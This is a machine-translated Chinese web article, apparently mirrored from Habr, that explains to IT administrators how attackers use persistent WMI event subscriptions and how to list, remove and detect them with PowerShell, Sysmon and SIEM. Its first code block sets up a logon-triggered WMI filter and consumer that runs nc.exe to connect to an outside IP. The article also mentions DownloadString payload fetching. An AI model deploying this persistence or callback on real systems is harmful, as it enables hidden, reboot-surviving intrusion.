<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经常发生的事件：IT管理员提示</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这些方法并非旨在培训潜在的黑客或冒犯想要报复雇主的雇员。</font><font style="vertical-align: inherit;">我要做的就是帮助IT专业人员了解黑客的思想，以便他们可以实施适当的防护以防止渗透攻击。</font><font style="vertical-align: inherit;">对于他们，我展示了如何使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-WmiInstance cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置过滤器和使用者对象</font><font style="vertical-align: inherit;">：</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您的作业是提出将这两个组件链接在一起的PowerShell代码。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在我自己的测试过程中，我能够获得一个永久事件以在目标系统上工作，而无需付出过多的努力和痛苦。</font><font style="vertical-align: inherit;">您还记得，使用持续时间与PowerShell会话一样长的临时WMI事件很难做到这一点。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
通过设置持久性WMI事件（例如，监视用户的登录），不需要内部人员或黑客保留在目标系统中。一个额外的好处是持久的WMI事件是可靠的：计算机重新启动时，事件触发器仍然起作用。这使WMI持续事件成为触发攻击的强大而隐秘的方式，它所涉及的不仅仅是监视。您还记得，WMI事件远非安全专家寻找攻击源的第一时间。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
例如，事件使用者的PowerShell代码可以充当启动器，并使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString下载</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在远程服务器上的恶意软件</font><font style="vertical-align: inherit;">。很棒的</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演讲</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在Black Hat会议上，Matt Graber包含了许多有关持久WMI事件潜在潜在恶意的信息。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如果您是安全专家，就其潜在的恶意使用而言，您将如何处理WMI事件？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
祝您好运：使用Get-WmiObject cmdlet（别名gwmi），您可以创建事件过滤器，使用者和绑定对象的列表：</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 您可以使用Get-WMIObject列出WMI持久性事件并设置适当的参数。</font><font style="vertical-align: inherit;">请注意缺少时间戳。</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，如果他们发现永久事件的过滤器（或使用者）可疑，IT专业人员可以使用PowerShell管道和</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI-RemoveObject cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其删除以将其关闭</font><font style="vertical-align: inherit;">：</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 删除持久性WMI事件涉及使用PowerShell管道，</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
请注意，此处既未指定事件的生成时间，也未指定恶意用户的名称。</font><font style="vertical-align: inherit;">要获取此取证信息，您将需要查阅Windows事件日志。</font><font style="vertical-align: inherit;">在下面的更多内容。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我可以禁用持久性WMI事件吗？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
至少，IT专业人员可以快速查看记录的WMI持续事件，并开始分析现实情况中的威胁迹象。也许，作为一名经验丰富的IT安全专家，您认为并非每个人都需要笔记本电脑上的WMI，而处理WMI持久性事件漏洞的最佳策略是完全禁用WMI。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以尝试禁用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font><font style="vertical-align: inherit;">，该</font><font style="vertical-align: inherit;">服务</font><font style="vertical-align: inherit;">将启动WMI。实际上，这不是那么简单。在我自己的测试过程中，我无法禁用此服务：该服务一次又一次自动启动。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
假设您仍然设法禁用它。 Windows管理软件在很大程度上取决于WMI，如果Winmgmt不可用，则该软件将不起作用。互联网上的</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论坛</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">充满警告禁止禁用WMI的消息。</font><font style="vertical-align: inherit;">我建议您听WMI并留意。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用Sysmon和SIEM识别威胁WMI事件</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
通常，您将必须接受WMI事件漏洞。幸运的是，与使用上述Powershell cmdlet相比，在Windows上有更有效的方法来检测持久性事件和其他可疑事件操作。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
认识Sysmon！我不会进入这个免费的Windows实用程序，它可以下载的细节</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这里</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这篇文章。我只能说，它使您可以在一处获得非常有用的信息以进行分析，而不必单独查看每个Windows事件日志。 Windows 7和更高版本的用户可能不需要Sysmon，因为更新的Windows系统使用更高级的标准日志记录机制。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon是Microsoft提供的一种方便，直观的事件记录工具，</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon将事件标识符19分配给永久WMI筛选器事件的创建（分配20以创建WMI使用者事件，分配21分配给WMI绑定）。如果打开事件查看器，则会在Microsoft-&gt; Windows-&gt; Sysmon部分中找到Sysmon事件日志。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您不想手动打开事件查看器以监视持久性WMI事件，这可能是黑客活动的标志。我们知道如何为您提供帮助。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为什么不创建WMI持久事件过滤器来监视（猜测的）WMI持久事件的创建？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github上</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个小项目，您将在其中找到配置此操作的代码。</font><font style="vertical-align: inherit;">这是WMI事件过滤器的代码段，可让您跟踪...是的WMI事件过滤器的创建：</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
显然，在这里我们需要信息安全和安全事件管理（SIEM）工具的帮助，因为证据被掩埋在杂志的废墟中。</font><font style="vertical-align: inherit;">我认为您了解一切。</font><font style="vertical-align: inherit;">您将需要一个</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全监视解决方案</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，该</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">解决方案</font></a><font style="vertical-align: inherit;">将SIEM功能与其他威胁的分析相结合，以检测和消除与持久性WMI事件相关的威胁。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation常见问题</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上述方法很可能用于在您的网络上实施监视系统，但是，您可能对WMI有一些疑问。</font><font style="vertical-align: inherit;">在本节中，我们将回答最常见的问题。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI是否已弃用？</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI本身并不过时，但WMIC已过时，这使许多人感到困惑。</font><font style="vertical-align: inherit;">现在可以使用PowerShell访问WMIC以前提供的功能。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI使用哪些端口？ </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI使用TCP端口135和许多动态端口：49152-65535（动态RPC端口：Windows Vista，2008和更高版本），TCP 1024-65535（动态RPC端口：Windows NT4，Windows 2000，Windows 2003）。</font><font style="vertical-align: inherit;">您也可以为WMI配置自定义端口范围。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI是否使用WimRM？ </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
此配置不是标准配置，但是您可以使用WMI使用脚本或应用程序，使用WinRM Scripting API或Winrm命令行工具来检索数据。</font><font style="vertical-align: inherit;">WinRM可以使用WMI收集资源数据或管理Windows操作系统中的资源。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结论</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如我们所见，WMI为管理员提供了监视远程进程和计算机的强大工具，可用于开发最终用户监视协议（EUMA）以自动警告可疑活动。</font><font style="vertical-align: inherit;">这使其成为检测和消除内部威胁，防止企图绕过安全策略以及监视系统使用方式的绝佳工具。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如果要了解有关如何使用WMI监视内部人员活动的更多信息，可以</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此处</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载我们的详细指南</font><font style="vertical-align: inherit;">。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN507048/index.html">Olya，测试和工厂-通往美丽架构和简洁代码的道路</a></li>
<li><a href="../zh-CN507050/index.html">空心骑士游戏设计分析。第1部分。被遗忘的十字路口</a></li>
<li><a href="../zh-CN507052/index.html">最酷的数据科学家不会浪费时间在统计上</a></li>
<li><a href="../zh-CN507058/index.html">Joel Spolsky：游戏化在堆栈溢出成功中的作用</a></li>
<li><a href="../zh-CN507066/index.html">在Google Ads上自动投放广告的10种方法</a></li>
<li><a href="../zh-CN507074/index.html">SIMD速查表，现在用于.NET Core</a></li>
<li><a href="../zh-CN507078/index.html">法院命令媒体删除他人的文章，并在主要的Yandex上发表反驳</a></li>
<li><a href="../zh-CN507080/index.html">所有杯赛：伟大的生态系统设计的故事</a></li>
<li><a href="../zh-CN507084/index.html">在大流行期间，SpatialChat派对变得很受欢迎-他们不太可能在海湾地区结束后</a></li>
<li><a href="../zh-CN507086/index.html">将Bash脚本转换为C＃代码以通过USB调制解调器HUAWEI E3372发送短信</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>